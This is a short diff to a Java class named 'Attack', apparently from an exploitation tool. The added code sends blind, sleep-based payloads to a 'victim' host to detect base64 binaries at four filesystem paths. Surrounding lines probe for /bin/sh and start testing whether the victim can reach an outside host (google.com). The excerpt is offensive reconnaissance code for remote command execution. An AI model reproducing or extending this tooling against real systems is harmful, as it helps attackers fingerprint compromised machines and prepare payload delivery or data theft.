@@ -147,6 +147,20 @@ public class Attack {
         log("OS: /bin/sh %s", isSh);
         log(" ");
 
+        final boolean isBase6401 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
+                AttackTools.payloadCmd("fileEx", "/bin/base64")));
+        final boolean isBase6402 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
+                AttackTools.payloadCmd("fileEx", "/sbin/base64")));
+        final boolean isBase6403 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
+                AttackTools.payloadCmd("fileEx", "/usr/bin/base64")));
+        final boolean isBase6404 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
+                AttackTools.payloadCmd("fileEx", "/usr/sbin/base64")));
+        log("OS: /bin/base64 %s", isBase6401);
+        log("OS: /sbin/base64 %s", isBase6402);
+        log("OS: /usr/bin/base64 %s", isBase6403);
+        log("OS: /usr/sbin/base64 %s", isBase6404);
+        log(" ");
+
         // Can connect?
         JSONObject connJson = AttackTools.payloadCmd("secConnect");
         connJson.put("host", "google.com");
